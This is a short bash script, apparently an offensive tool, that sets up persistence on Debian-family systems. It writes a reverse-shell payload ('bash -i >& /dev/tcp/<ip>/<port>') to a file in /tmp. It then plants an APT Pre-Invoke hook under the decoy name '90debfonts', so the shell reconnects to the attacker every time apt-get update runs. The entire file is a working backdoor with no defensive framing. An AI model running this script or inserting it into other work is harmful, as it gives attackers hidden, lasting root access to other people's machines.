#/bin/bash

if [[ $(id -u) != 0 ]]
then
	printf "%s\n" "Run this program as sudo user"
	exit
fi


function _help_(){

	printf "usage sudo bash apt-get_update_hook.sh <ip> <port>\n"
	exit
}


function apt-get_update-hook(){

custom_script="/tmp/8736479374"
apt_file="/etc/apt/apt.conf.d/90debfonts"

cat << EOF > "$custom_script"
#!/bin/bash
bash -c "bash -i >& /dev/tcp/$1/$2 0>&1" 2>/dev/null &
EOF

cat << EOF > "$apt_file"
APT::Update::Pre-Invoke {"bash $custom_script";};
EOF

printf "[\e[0;32m+\e[0m] apt-get update hooked\n"
printf "[\e[0;32m+\e[0m] Persistence through apt-get update success\n"

}


if [[ -z "$1" ]] || [[ -z "$2" ]]
then
	_help_
fi

apt-get_update-hook "$1" "$2"

